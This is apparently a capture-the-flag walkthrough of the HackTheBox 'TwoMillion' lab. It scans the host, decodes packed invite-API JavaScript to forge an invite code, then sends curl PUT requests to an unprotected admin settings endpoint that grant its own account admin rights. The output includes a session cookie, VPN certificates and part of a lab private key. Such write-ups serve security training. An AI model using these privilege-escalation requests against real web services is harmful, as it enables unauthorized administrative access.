```
How many TCP ports are open?
2

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.11.221 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.11.221:22
Open 10.10.11.221:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 20:21 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:21
Completed NSE at 20:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:21
Completed NSE at 20:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:21
Completed NSE at 20:21, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:21
Completed Parallel DNS resolution of 1 host. at 20:21, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:21
Scanning 10.10.11.221 [2 ports]
Discovered open port 22/tcp on 10.10.11.221
Discovered open port 80/tcp on 10.10.11.221
Completed Connect Scan at 20:21, 0.22s elapsed (2 total ports)
Initiating Service scan at 20:21
Scanning 2 services on 10.10.11.221
Completed Service scan at 20:21, 6.55s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:21
Completed NSE at 20:22, 5.94s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:22
Completed NSE at 20:22, 0.71s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:22
Completed NSE at 20:22, 0.00s elapsed
Nmap scan report for 10.10.11.221
Host is up, received user-set (0.22s latency).
Scanned at 2023-07-28 20:21:50 EDT for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx
|_http-title: Did not follow redirect to http://2million.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:22
Completed NSE at 20:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:22
Completed NSE at 20:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:22
Completed NSE at 20:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.25 seconds

┌──(root㉿kali)-[/home/witty/Downloads]
└─# tac /etc/hosts
10.10.11.221  2million.htb

view-source:http://2million.htb/js/inviteapi.min.js

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))


What is the name of the JavaScript file loaded by the `/invite` page that has to do with invite codes?

inviteapi.min.js

What JavaScript function on the invite page returns the first hint about how to get an invite code?

makeInviteCode

https://lelinhtinh.github.io/de4js/

choose eval

function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

On putting a valid code into the form on `/invite`, to what URL path is the browser redirected?

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate      
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}                                                                          
┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
Using Cyberchef
In order to generate the invite code, make a POST request to /api/v1/invite/generate

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX POST http://2million.htb/api/v1/invite/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "QTBWM1QtODNHVkMtTDhUN0ktR0xHUjA=",
    "format": "encoded"
  }
}

┌──(witty㉿kali)-[~/Downloads]
└─$ echo "QTBWM1QtODNHVkMtTDhUN0ktR0xHUjA=" | base64 -d
A0V3T-83GVC-L8T7I-GLGR0 

after submitting code we got redirected to register

register test1 test1@2million.htb then a random pass

What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?

/api/v1/user/vpn/generate

http://2million.htb/home/access

then click Connection Pack

GET /api/v1/user/vpn/generate HTTP/1.1

Host: 2million.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://2million.htb/home/access

Cookie: PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh

Upgrade-Insecure-Requests: 1

How many API endpoints are there under `/api/v1/admin`?

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -v 2million.htb/api
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80 (#0)
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Sat, 29 Jul 2023 00:51:13 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=5tbomfia6u3pj8b4bnrp9pauc5; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sv 2million.htb/api --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" | jq
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80 (#0)
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/7.87.0
> Accept: */*
> Cookie: PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sat, 29 Jul 2023 00:56:51 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [47 bytes data]
* Connection #0 to host 2million.htb left intact
{
  "/api/v1": "Version 1 of the API"
}


┌──(witty㉿kali)-[~/Downloads]
└─$ curl 2million.htb/api/v1 --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   800    0   800    0     0   1732      0 --:--:-- --:--:-- --:--:--  1913
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -s 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" | jq
{
  "message": false
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -svX POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" | jq
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80 (#0)
> POST /api/v1/admin/vpn/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/7.87.0
> Accept: */*
> Cookie: PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Sat, 29 Jul 2023 01:06:13 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [5 bytes data]
* Connection #0 to host 2million.htb left intact

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" | jq
{
  "status": "danger",
  "message": "Invalid content type."
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -svX PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" | jq
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80 (#0)
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/7.87.0
> Accept: */*
> Cookie: PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sat, 29 Jul 2023 01:07:53 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [64 bytes data]
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Invalid content type."
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" --header "Content-Type: application/json" | jq 
{
  "status": "danger",
  "message": "Missing parameter: email"
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" --header "Content-Type: application/json" --data '{"email":"test1@2million.htb"}' | jq
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" --header "Content-Type: application/json" --data '{"email":"test1@2million.htb","is_admin": true}' | jq 
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" --header "Content-Type: application/json" --data '{"email":"test1@2million.htb","is_admin": 1}' | jq   
{
  "id": 17,
  "username": "test1",
  "is_admin": 1
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -s 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" | jq                                                 
{
  "message": true
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" --header "Content-Type: application/json" | jq
{
  "status": "danger",
  "message": "Missing parameter: username"
}

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" --header "Content-Type: application/json" --data '{"username":"test1"}'     
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
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
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2 (0x2)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Jul 29 01:14:06 2023 GMT
            Not After : Jul 28 01:14:06 2024 GMT
        Subject: C=GB, ST=London, L=London, O=test1, CN=test1
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:b9:7d:f2:5f:d2:b7:95:87:72:05:ec:2b:85:29:
                    ef:af:60:dc:18:0c:71:90:30:28:d7:14:62:cd:86:
                    ae:fc:af:03:26:93:e8:08:82:2c:6f:06:e1:ba:2a:
                    03:13:fb:5e:aa:38:fc:5b:61:75:cb:3f:0d:c4:8a:
                    df:70:d5:1a:da:56:0c:8b:9f:25:71:77:75:5e:17:
                    f2:54:62:79:d5:df:12:80:ff:b1:2b:58:8a:83:be:
                    29:e5:0e:b7:18:79:61:c5:36:a2:02:cb:b8:87:5c:
                    34:6d:bc:20:95:ba:b4:60:8e:ae:92:48:05:62:86:
                    9d:ca:b9:7f:f0:02:01:3f:1e:bb:fc:c1:1f:e2:ad:
                    d7:92:52:8f:b2:70:09:0c:c1:d0:08:57:30:1a:3c:
                    d3:52:ba:36:b8:87:b3:9c:db:68:a9:a5:a6:1f:81:
                    7a:fb:f1:ff:45:a4:e9:b1:68:96:7f:96:b4:56:81:
                    38:bd:de:46:f4:73:ee:cc:6b:53:d2:90:e2:7b:5b:
                    83:7b:9b:14:aa:e7:e2:d7:68:cd:19:20:69:c9:21:
                    23:f9:4e:7e:b1:92:59:bf:83:01:66:4b:ad:e7:73:
                    ae:50:d2:e5:96:8d:d4:f2:db:5e:d6:26:18:99:07:
                    f5:1b:d0:e4:2d:32:96:27:2d:c6:20:7c:41:ba:ee:
                    bb:e9
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                6D:C6:18:C8:65:6A:92:E7:05:5F:46:CB:39:CB:DF:83:54:80:11:1D
            X509v3 Authority Key Identifier: 
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment: 
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        ab:fb:b0:1c:5f:81:63:8b:9e:a5:86:2f:7e:7e:5f:dc:6d:d6:
        1a:06:7d:79:87:23:a4:c1:cd:cc:8c:85:a0:4b:df:d4:3a:7c:
        33:72:4c:16:f4:86:23:80:f3:2d:0b:de:3b:88:82:ef:32:ef:
        9f:86:f7:02:db:16:7f:2b:7f:4b:dd:76:c2:8a:3e:8e:4f:5a:
        7c:9a:7d:9a:c7:3f:0e:4b:e5:1d:9b:24:b8:1e:8b:02:86:0d:
        46:db:24:69:27:a0:1d:a4:34:0d:5a:9a:7c:79:9d:a1:da:a9:
        0f:25:2f:4c:70:c8:80:47:d0:45:58:d7:98:a1:1d:c5:bf:fe:
        b7:ed:4e:ad:61:1f:61:19:8f:3a:8c:d6:a8:b3:d6:63:57:2f:
        23:99:d0:f5:df:fe:fb:cc:09:dd:bb:27:98:47:cf:f3:b6:bf:
        2e:bb:1b:e3:bf:5f:17:41:90:08:be:cb:81:e9:b2:4f:5e:0a:
        9e:be:21:32:e0:a7:ce:38:77:be:e7:a6:05:05:09:76:6a:99:
        b3:64:84:14:1a:aa:48:6e:c7:06:a1:2d:b2:13:7e:1e:fa:29:
        62:bd:b9:cc:77:3f:df:53:30:d0:e4:67:16:d3:e2:4b:5d:96:
        e5:6c:18:06:c3:e5:1c:a0:f3:d2:43:be:4d:c9:a1:b9:c0:34:
        25:de:63:7b:7e:d5:f3:fa:5a:cb:5d:d3:30:7d:fa:be:ed:dd:
        7f:1c:24:39:87:91:3c:3a:fc:18:a9:51:ec:04:a0:24:c2:32:
        c3:a3:91:6a:30:45:11:30:8c:ad:d7:e4:cb:47:be:41:56:13:
        83:b0:91:ed:78:9b:d1:a1:3b:fd:39:83:98:09:96:ae:8f:d2:
        a2:d7:db:e8:f6:0b:2d:37:a0:a6:b3:38:bb:2f:6d:ad:56:20:
        a9:00:5f:08:46:83:9f:3f:83:fb:35:6d:81:6e:b2:93:2a:07:
        80:68:98:4d:51:f0:f1:66:a3:24:85:a1:60:62:91:94:ea:f3:
        1f:ff:4d:6b:be:32:fb:5b:97:61:70:59:f9:65:58:fd:44:ad:
        f4:59:9a:a8:01:7d:3b:86:0f:63:ae:94:a6:33:9b:90:05:20:
        74:b1:a2:a3:bb:df:2c:ad:0a:b1:41:94:26:1a:05:00:da:af:
        95:7e:17:c1:f7:d0:c0:56:8e:91:d5:6c:44:44:2e:38:97:b1:
        27:62:0f:66:a9:21:39:8c:d5:1f:3f:ed:58:48:f0:ad:d8:e1:
        ab:f8:15:61:c3:8e:ad:b8:12:ca:d4:75:f2:7a:c0:ea:e9:05:
        69:cd:ef:7f:0e:ce:b5:fa:a6:6c:47:3f:5a:57:5c:e2:8d:8d:
        e7:24:9d:f9:1d:8d:b3:2a
-----BEGIN CERTIFICATE-----
MIIE3TCCAsWgAwIBAgIBAjANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjMwNzI5MDExNDA2WhcNMjQw
NzI4MDExNDA2WjBPMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xDjAMBgNVBAoMBXRlc3QxMQ4wDAYDVQQDDAV0ZXN0MTCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALl98l/St5WHcgXsK4Up769g3BgM
cZAwKNcUYs2GrvyvAyaT6AiCLG8G4boqAxP7Xqo4/Fthdcs/DcSK33DVGtpWDIuf
JXF3dV4X8lRiedXfEoD/sStYioO+KeUOtxh5YcU2ogLLuIdcNG28IJW6tGCOrpJI
BWKGncq5f/ACAT8eu/zBH+Kt15JSj7JwCQzB0AhXMBo801K6NriHs5zbaKmlph+B
evvx/0Wk6bFoln+WtFaBOL3eRvRz7sxrU9KQ4ntbg3ubFKrn4tdozRkgackhI/lO
frGSWb+DAWZLredzrlDS5ZaN1PLbXtYmGJkH9RvQ5C0ylictxiB8Qbruu+kCAwEA
AaOBiTCBhjAdBgNVHQ4EFgQUbcYYyGVqkucFX0bLOcvfg1SAER0wHwYDVR0jBBgw
FoAUemLdHbb+Ssjj+J/6rPQVDJa6LpEwCQYDVR0TBAIwADALBgNVHQ8EBAMCAf4w
LAYJYIZIAYb4QgENBB8WHU9wZW5TU0wgR2VuZXJhdGVkIENlcnRpZmljYXRlMA0G
CSqGSIb3DQEBCwUAA4ICAQCr+7AcX4Fji56lhi9+fl/cbdYaBn15hyOkwc3MjIWg
S9/UOnwzckwW9IYjgPMtC947iILvMu+fhvcC2xZ/K39L3XbCij6OT1p8mn2axz8O
S+UdmyS4HosChg1G2yRpJ6AdpDQNWpp8eZ2h2qkPJS9McMiAR9BFWNeYoR3Fv/63
7U6tYR9hGY86jNaos9ZjVy8jmdD13/77zAnduyeYR8/ztr8uuxvjv18XQZAIvsuB
6bJPXgqeviEy4KfOOHe+56YFBQl2apmzZIQUGqpIbscGoS2yE34e+ilivbnMdz/f
UzDQ5GcW0+JLXZblbBgGw+UcoPPSQ75NyaG5wDQl3mN7ftXz+lrLXdMwffq+7d1/
HCQ5h5E8OvwYqVHsBKAkwjLDo5FqMEURMIyt1+TLR75BVhODsJHteJvRoTv9OYOY
CZauj9Ki19vo9gstN6Cmszi7L22tViCpAF8IRoOfP4P7NW2BbrKTKgeAaJhNUfDx
ZqMkhaFgYpGU6vMf/01rvjL7W5dhcFn5ZVj9RK30WZqoAX07hg9jrpSmM5uQBSB0
saKju98srQqxQZQmGgUA2q+VfhfB99DAVo6R1WxERC44l7EnYg9mqSE5jNUfP+1Y
SPCt2OGr+BVhw46tuBLK1HXyesDq6QVpze9/Ds61+qZsRz9aV1zijY3nJJ35HY2z
Kg==
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC5ffJf0reVh3IF
7CuFKe+vYNwYDHGQMCjXFGLNhq78rwMmk+gIgixvBuG6KgMT+16qOPxbYXXLPw3E
it9w1RraVgyLnyVxd3VeF/JUYnnV3xKA/7ErWIqDvinlDrcYeWHFNqICy7iHXDRt
vCCVurRgjq6SSAVihp3KuX/wAgE/Hrv8wR/irdeSUo+ycAkMwdAIVzAaPNNSuja4
h7Oc22ippaYfgXr78f9FpOmxaJZ/lrRWgTi93kb0c+7Ma1PSkOJ7W4N7mxSq5+LX
aM0ZIGnJISP5Tn6xklm/gwFmS63nc65Q0uWWjdTy217WJhiZB/Ub0OQtMpYnLcYg
fEG67rvpAgMBAAECggEAFKyZfZ2mUZe5mThj92Efslvo3BNS+v+rJaHDi2XGDirR
fpTAqWYc3rkVIqM5GZqMSAu28NZxgxhBiBT0Z4aRCiHKHyu7SCTI45Zmr4oUS0ak
MNWO4SZqtdlVoQ6dULCCubDnqMkdBZU80LhFp3qaTSLKCUrWss8POj+np1AJ5Idv
CSV+jOrtcfJ/JfAw3yv8jNVafJOdDFZ9/C2OALlwqN1JBFQujpw4iUEk2aX5kUyu
0u3T7WiDpmFXHYKp7s4xy5qCjVuQITestghSYuhv2FxPDa4N0iHdrAmiPHihTieM
zUWFbr087wvhg2UM/qiyUZHk1iPsYJMyMb2WWLiHiwKBgQDCuOHv5FsV9UZ48TCl
Fyi5DjHqu8gha7hZ3ejWzG3CrYg5ZYmQwYB5j6+yuFHd0rLXQcS8oBYHAkAffPqJ
2vtZeaN8XpHXWZB8Gg5WKE+9UTY/8fH5vho85hcwfE/3RXCYN/reZ+6VwatSc2se
